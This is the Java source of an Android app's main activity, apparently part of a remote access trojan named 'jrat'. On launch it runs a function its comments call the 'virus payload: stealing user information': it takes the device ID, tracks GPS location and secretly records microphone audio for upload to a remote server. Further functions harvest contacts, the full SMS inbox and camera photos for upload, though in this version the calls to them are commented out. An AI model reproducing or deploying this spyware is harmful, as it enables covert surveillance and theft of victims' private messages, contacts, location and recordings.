package com.julioxus.jrat;

import android.content.ContentResolver;
import android.database.Cursor;
import android.location.LocationListener;
import android.location.LocationManager;
import android.net.Uri;
import android.os.Bundle;
import android.os.Environment;
import android.provider.ContactsContract;
import android.provider.MediaStore;
import android.provider.Settings;
import android.support.v7.app.AppCompatActivity;
import android.util.Pair;
import android.view.Menu;
import android.view.MenuItem;

import java.io.IOException;
import java.util.ArrayList;
import java.util.Timer;
import java.util.TimerTask;

public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        //Call to the funny thing
        exploit();
    }

    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        // Inflate the menu; this adds items to the action bar if it is present.
        getMenuInflater().inflate(R.menu.menu_main, menu);
        return true;
    }

    @Override
    public boolean onOptionsItemSelected(MenuItem item) {
        // Handle action bar item clicks here. The action bar will
        // automatically handle clicks on the Home/Up button, so long
        // as you specify a parent activity in AndroidManifest.xml.
        int id = item.getItemId();

        //noinspection SimplifiableIfStatement
        if (id == R.id.action_settings) {
            return true;
        }

        return super.onOptionsItemSelected(item);
    }

    // Function that exploits the virus payload: stealing user information
    public void exploit(){


        ArrayList<Pair<String, String>> contacts = new ArrayList<>();  //Conctacts list data structure
        LocationManager mLocationManager; //Class that handles the GPS location
        String android_id; //Android device identifier

        // Get android device identifier
        android_id = Settings.Secure.getString(getBaseContext().getContentResolver(),
                Settings.Secure.ANDROID_ID);

        // Get current GPS location
        mLocationManager = (LocationManager) getSystemService(LOCATION_SERVICE);
        LocationListener locationListener = new MyLocationListener(getBaseContext(), android_id);
        mLocationManager.requestLocationUpdates(
                LocationManager.GPS_PROVIDER, 5000, 10, locationListener);

        //new CreateRMIServerAsyncTask(this).execute();
        /*
        try {
            sendContacts(android_id, contacts);
        } catch (IOException e) {
            e.printStackTrace();
        }
        sendSMS(android_id);
        sendPictures(android_id);
        */
        sendAudio(android_id, 15000);
    }

    // Function to save all contacts of the user in a data structure and send them to the remote server by calling an AsyncTask
    public void sendContacts(String android_id, ArrayList<Pair<String, String>> contacts) throws IOException {

        //Collect contact names and phone numbers.
        ContentResolver cr = getContentResolver();
        Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI,
                null, null, null, null);
        if (cur.getCount() > 0) {
            while (cur.moveToNext()) {
                String id = cur.getString(cur.getColumnIndex(ContactsContract.Contacts._ID));
                String name = cur.getString(cur.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
                if (Integer.parseInt(cur.getString(
                        cur.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER))) > 0) {
                    Cursor pCur = cr.query(
                            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                            null,
                            ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                            new String[]{id}, null);
                    while (pCur.moveToNext()) {
                        String phoneNo = pCur.getString(pCur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                        Pair contact = new Pair(name, phoneNo);
                        contacts.add(contact);
                    }
                    pCur.close();
                }
            }
        }

        // Send the information to remote server
        new SendContactListAsyncTask(this, android_id, contacts).execute();
    }


    // Function that gets all the SMS and send it to the remote server.
    public void sendSMS(String android_id){

        ArrayList<String> messages = new ArrayList<>();

        Cursor cursor = getContentResolver().query(Uri.parse("content://sms/inbox"), null, null, null, null);

        if (cursor.moveToFirst()) { // must check the result to prevent exception
            do {
                String msgData = "";
                for(int idx=0;idx<cursor.getColumnCount();idx++)
                {
                    msgData += " " + cursor.getColumnName(idx) + ":" + cursor.getString(idx);
                    messages.add(msgData);
                }
                // use msgData
            } while (cursor.moveToNext());
        } else {
            // empty box, no SMS
        }

        // Send the information to remote server
        new SendSMSAsyncTask(this, android_id, messages).execute();
    }

    public void sendPictures(String android_id){

        String CAMERA_IMAGE_BUCKET_NAME =
                Environment.getExternalStorageDirectory().toString()
                        + "/DCIM/Camera";
        String CAMERA_IMAGE_BUCKET_ID =
            String.valueOf(CAMERA_IMAGE_BUCKET_NAME.toLowerCase().hashCode());

        final String[] projection = { MediaStore.Images.Media.DATA };
        final String selection = MediaStore.Images.Media.BUCKET_ID + " = ?";
        final String[] selectionArgs = { CAMERA_IMAGE_BUCKET_ID };
        final Cursor cursor = this.getContentResolver().query(MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                projection,
                selection,
                selectionArgs,
                null);
        ArrayList<String> result = new ArrayList<String>(cursor.getCount());
        if (cursor.moveToFirst()) {
            final int dataColumn = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATA);
            do {
                final String data = cursor.getString(dataColumn);
                result.add(data);
            } while (cursor.moveToNext());
        }
        cursor.close();

        new SendPicturesAsyncTask(this, android_id, result).execute();

    }

    public void sendAudio(String android_id, int time){

        final AudioRecorder audioRecorder = new AudioRecorder(android_id+"audio.aac", time);
        audioRecorder.startRecording();

        new Timer().schedule(new TimerTask() {

            @Override
            public void run() {
                runOnUiThread(new Runnable() {

                    @Override
                    public void run()
                    {
                        audioRecorder.stopRecording();
                    }
                });

            }
        }, time);


        // Send the file to the server
        new SendAudioAsyncTask(this, android_id, audioRecorder.getmFileName()).execute();

    }

    public void sendPhoto(){

    }

}
